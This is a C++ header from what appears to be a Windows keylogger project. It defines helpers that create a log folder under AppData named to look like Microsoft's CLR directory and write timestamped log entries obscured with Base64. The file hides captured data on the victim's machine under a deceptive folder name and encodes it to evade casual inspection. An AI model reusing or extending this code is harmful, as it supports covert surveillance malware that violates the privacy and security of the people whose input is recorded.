#ifndef IO_H
#define IO_H

#include <string>
#include <cstdlib>
#include "windows.h"
#include <fstream>

#include "KLint.h"
#include "Base64.h"

namespace IO
{
    std::string getBasePath (const bool append_seperator = false)
    {
        std::string APP_DATA_DIR(getenv("APPDATA"));
        std::string LOGS_PATH = APP_DATA_DIR + "\\Microsoft\\CLR";
        return LOGS_PATH + (append_seperator ? "\\" : "");
    }

    bool createDir(std::string path)
    {
        return (bool)CreateDirectory(path.c_str(), NULL) ||
                GetLastError() == ERROR_ALREADY_EXISTS;
    }

    bool mkDir(std::string path)
    {
        for(char &c : path)
        {
            if(c == '\\')
            {
                c = '\0';
                if(!createDir(path))
                    return false;
                c = '\\';
            }
        }

        return true;
    }

    template <class T>
    std::string writeLog(const T &t)
    {
        std::string path = getBasePath(true);
        KL::dateTime cdt;
        std::string fname = cdt.getDateTime("_") + ".log";

        try
        {
            std::ofstream file(path + fname);
            if(!file) return "";
            std::ostringstream s;
            s << "[" << cdt.getDateTime() << "]" <<
            std::endl << t << std::endl;
            std::string data = Base64::encryptB64(s.str());
            file << data;

            if(!file)
                return "";

            file.close();

            return fname;
        }
        catch(...)
        {
            return "";
        }

    }
}

#endif

